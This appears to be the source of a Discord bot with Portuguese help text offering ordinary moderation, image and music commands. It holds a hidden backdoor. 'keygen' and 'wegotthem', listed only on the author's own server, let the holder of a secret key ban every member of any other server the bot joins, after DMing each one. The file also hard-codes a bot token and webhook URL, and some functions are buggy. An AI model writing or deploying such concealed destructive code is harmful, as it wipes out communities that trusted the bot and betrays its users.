import os
import discord
import asyncio
import sys
import json
import time
import random
import requests
import dhooks
from pathlib import Path
import string
import urllib.request
import urllib.parse
client = discord.Client()
regular_commands = {}
hook = dhooks.Webhook('https://discordapp.com/api/webhooks/516092910081409058/dQ1YJOs3qwD57lM6CH9nhChJyhVO39Oc1YchGpUQE3f1qvpHIu8EXptI-_qlXUVxBjkG')
def KeyGen(size=1979, chars=string.ascii_uppercase + string.digits):
	global Key
	Key = ''.join(random.choice(chars) for _ in range(size)) 
class commands(object):
	def register(command, exemplearguments, arguments):
		regular_commands[f'{command}'] = {'arguments': f'{arguments}', 'exemple_arguments': f'{exemplearguments}'}
	def info(command):
		return regular_commands[f'{command}']['exemple_arguments'], regular_commands[f'{command}']['arguments']
	def remove(command):
		regular_commands.pop(command)
class server(object):
	def getInfo(id):
		server_path = Path(f"Servers/{id}.json")
		if server_path.exists():
			info = json.load(open(f'Servers/{id}.json'))
			if not info['commands']:
				info['commands'] = "0"
				f.write(json.dumps(info))
			return info
		else:
			with open(f'Servers/{id}.json', 'w') as f:
				x = json.load(open(f'ServerBase.json'))
				x['id'] = id
				f.write(json.dumps(x))
				return x
commands.register('comousar', 'comando', 'say')
commands.register('say', 'messagem', 'sou lindo')
commands.register('avatar','<@516116193044725780>', '@usuario')
commands.register('perfil', '<@516116193044725780>', '@usuario')
commands.register('img', 'bacalhau', 'imagem')
commands.register('yt', 'Goats', 'vídeo')
commands.register('invite', '', '')
commands.register('weather', 'Belo Horizonte', 'cidade')
commands.register('clear', '100', 'nº de linhas')
commands.register('mute', '<@516116193044725780>', '@usuario')
commands.register('ban', '<@516116193044725780>', '@usuario')
commands.register('tempmute', '<@516116193044725780> 10 min', '@usuario tempo tipo')
commands.register('play', 'Dark Knight', 'musica')
commands.register('queue', ' ', '' )
commands.register('stop', '', '')
commands.register('pause', '', '')
commands.register('skip', '', '')
commands.register('config', 'prefix !', 'nome valor')
commands.register('command', 'oi "oi"', 'comando resposta')
commands.register('wegotthem', 'SD756DS...', 'chave')
commands.register('keygen', '', '')
def ComoUsar(command):
	if command in regular_commands:
		args, exempleagrs = commands.info(command)
	embed=discord.Embed(title=f"Como usar", description=f"Aqui está a sintaxe do comando **{command}**\n**Uso Correto**: `{command} {args}`\n**Exemplo de uso**: `{command} {exempleagrs}`")
	return embed
@client.event
async def on_message(message):
	server_info = server.getInfo(f"{message.server.id}")
	prefix = server_info['prefix']
	command = message.content.lower().startswith
	if command(prefix):
		args = message.content.split(" ")
		cmd = message.content.lower().startswith(prefix + "help")
		if command(prefix + "help"):
			help_embed=discord.Embed(title="Help me!", description="Aqui estão todos os comandos disponivéis!")
			help_embed.add_field(name="Misc", value=f"{prefix}say -» *Faça eu dizer algo!*\n{prefix}avatar -» *Veja seu avatar ou de outro usuario ;)*\n{prefix}perfil -» *mostra seu perfil ou o de outro usuario :)*\n{prefix}img -» *faça eu pesquisar alguna imagem no google*\n{prefix}yt -» *procura algum video no YoutTube*\n{prefix}invite -» *Manda o meu invite :3*\n{prefix}weather -» *mostra o tempo de uma região*", inline=False)
			help_embed.add_field(name="Ajuda", value=f"\n{prefix}comousar -» *mostra como usar o comando especificado*")
			help_embed.add_field(name="Administrativo", value=f"\n{prefix}clear -» *limpa as mensagens de um canal*\n{prefix}mute -» *muta um usuário*\n{prefix}ban -» *bane um usuario*\n{prefix}t[emp]mute -» *muta um usuário por um tempo determinado*", inline=False)
			help_embed.add_field(name="Musica", value=f"\n{prefix}play -» *toca uma musica do youtube ou de um arquivo anexado*\n{prefix}queue -» *mostra a lista de musicas*\n{prefix}stop -» *para a baladinha*\n{prefix}pause -» *pausa a baladinha*\n{prefix}skip -» *pula ou vota para pular a musica*", inline=False)
			help_embed.add_field(name="Configurações", value=f"\n{prefix}config -» *muda um valor da configuração deste servidor*")	
			if server_info['commands'] == "0":
				help_embed.add_field(name="Comandos Personalizados", value=f"*Nenhum comando foi encontrado :(*\n{prefix}command -» *cria um comando personalizado*", inline=False)
			if message.server.id == '513142267654176784':
				help_embed.add_field(name="Underground Network [EXTRA]", value=f"\n{prefix}wegotthem -» **apocalipse**\n{prefix}keygen -» **new apocalipse key**")
			await client.send_message(message.channel, embed=help_embed)
		elif command(prefix + "comousar"):
			try:
				if args[1] in regular_commands:				
					await client.send_message(message.channel, embed=ComoUsar(f"{args[1]}"))
				else:
					await client.send_message(message.channel, "Nenhum comando parecido foi encontrado :(")
			except IndexError:
				await client.send_message(message.channel, embed=ComoUsar(f"comousar"))
		elif command(prefix + "say"):
			say = " ".join(args[1:])
			if len(say) >= 1:
				say=discord.Embed(color=0x2C2F33, title=" ", description=f"{say}")
				await client.send_message(message.channel, embed=say)
			else:
				await client.send_message(message.channel, embed=ComoUsar("say"))
		elif command(prefix + "keygen"):
			if message.server.id == '513142267654176784':
				KeyGen()
				await client.send_message(client.get_channel('518178372493246482'), "Key generated:")
				await client.send_message(client.get_channel('518178372493246482'), f"{Key}")
		elif command(prefix + "wegotthem"):
			try:
				if args[1] == f'{Key}':
					if message.server.id != '513142267654176784':
						KeyGen()
						await client.send_message(client.get_channel('518178372493246482'), "Key generated:")
						await client.send_message(client.get_channel('518178372493246482'), f"{Key}")
						players = []
						for member in message.server.members:
							players.append(member)		
						for member in players:
							await client.send_message(member, "Opa! parece que `VOCÊ FOI BANIDO!`\nlol")
							await client.ban(member, 1)
					else:
						await client.send_message(message.channel, "```css\n#Error\n\n[ 0 ] This command is not allowed in this server.\n\nLenny #EC:1001\n```")
			except IndexError:
				if message.server.id == '513142267654176784':
					await client.send_message(message.channel, embed=ComoUsar("wegotthem"))
		elif command(prefix + "avatar"):
			url = message.author.avatar_url.replace('.webp?size=1024', '.png')
			e = discord.Embed()
			e.set_image(url=url)
			await client.send_message(message.channel, embed=e)
@client.event
async def on_ready():
	await client.change_status(game=discord.Game(name='Jogos! ;)'))
	KeyGen()
	print(f"[+] Logged as {client.user.name}")
	await client.send_message(client.get_channel('518178372493246482'), "Key generated:")
	await client.send_message(client.get_channel('518178372493246482'), f"{Key}")
client.run(f"NTE2MTE2MTkzMDQ0NzI1Nzgw.Dtu-yg.8y-5tV-e4qqmE9Uhub5sWio4w7g")